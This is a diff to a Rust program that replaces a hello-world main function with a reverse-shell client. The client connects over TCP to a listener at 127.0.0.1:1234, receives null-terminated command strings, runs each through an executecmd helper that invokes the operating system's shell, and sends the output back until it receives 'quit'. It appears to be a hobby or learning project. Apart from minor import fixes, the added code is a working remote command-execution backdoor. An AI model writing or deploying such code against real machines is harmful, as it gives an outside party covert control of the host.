@@ -1,5 +1,6 @@
 use std::net::{Ipv4Addr, SocketAddrV4, TcpListener, TcpStream, Shutdown};
-use std::process::{Command, exit,};                             use std::io{self, Write, BufReader};
+use std::process::{Command, exit,};
+use std::io::{self, Write, BufReader, BufRead};
 
 
 
@@ -31,5 +32,27 @@ let res = if cfg!(target_os = "windows") {
 
 
 fn main() {
-    println!("Hello, world!");
+    let mut client = TcpStream::connect("127.0.0.1:1234").unwrap();
+    println!("Connected to {}", client.peer_addr().unwrap());
+
+    loop{
+
+    let mut buffer:Vec<u8> = Vec::new();
+    let mut reader = BufReader::new(&client);
+    reader.read_until(b'\0', &mut buffer);
+    
+    println!("Received from server: {}", String::from_utf8_lossy(&buffer).trim());
+
+    if buffer.len() == 0 ||String::from_utf8_lossy(&buffer).trim_end_matches('\0') == "quit"{
+        break;
+    }
+
+    let mut output = executecmd(String::from_utf8_lossy(&buffer).trim_end_matches('\0'));
+    
+    output.push('\0');
+
+    client.write(&mut output.as_bytes());
+    
+    }
+    client.shutdown(Shutdown::Both);
 }
